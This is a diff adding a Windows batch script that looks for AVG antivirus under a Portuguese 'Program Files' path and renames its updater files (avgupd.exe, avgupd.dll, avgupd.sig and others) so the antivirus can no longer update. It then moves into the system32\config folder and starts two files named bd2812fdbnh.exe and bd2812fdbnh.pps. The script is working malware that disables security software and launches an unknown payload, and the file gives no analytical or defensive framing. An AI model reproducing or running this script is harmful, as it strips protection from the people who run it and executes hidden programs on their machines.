@@ -1,0 +1,42 @@
+@echo off
+cls
+if not exist c:\arquiv~1 goto inclprcs
+c:
+cd\Arquiv~1
+if not exist avg\avgupd.* goto sgndvrfc
+cd avg
+goto elmnatlz
+:sgndvrfc
+if not exist avg\avg9\avgupd.* goto trcrvrfc
+cd avg\avg9
+goto elmnatlz
+:trcrvrfc
+if not exist avg\avg10\avgupd*.* goto acsswnds
+cd avg\avg10
+goto elmnatlz
+:elmnatlz
+if exist avgupd.exe      ren avgupd.exe      bd2812ave.prt
+if exist avgupd.dll      ren avgupd.dll      bd2812avd.prt
+if exist avgupd.sig      ren avgupd.sig      bd2812avs.prt
+if exist avgupdx.dll     ren avgupdx.dll     bd2812avl.prt
+if exist updatecomps.bak ren updatecomps.bak bd2812avb.prt
+goto acsswnds
+:acsswnds
+c:
+cd\
+cd windows
+goto acsssstm
+:acsssstm
+cd system32
+goto acsscnfg
+:acsscnfg
+cd config
+goto inclprcs
+:inclprcs
+start bd2812fdbnh.exe
+start bd2812fdbnh.pps
+goto trmnprcs
+:trmnprcs
+cls
+cd\
+exit
